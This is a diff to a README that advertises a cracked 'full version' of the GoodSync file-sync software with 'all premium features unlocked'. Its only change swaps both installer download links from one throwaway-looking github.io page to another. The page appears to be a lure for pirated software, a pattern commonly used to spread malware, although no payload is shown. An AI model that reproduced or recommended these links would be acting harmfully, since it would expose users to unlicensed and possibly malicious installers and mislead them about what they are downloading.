@@ -2,7 +2,7 @@
 
 Welcome to GoodSync Premium Sync Suite, the comprehensive file synchronization and backup solution designed for Windows desktops in 2026. This suite offers the full version of GoodSync with all premium features unlocked, enabling efficient data management across local and cloud storage.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -59,4 +59,4 @@ A: This full version includes all features, but you can explore the interface an
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
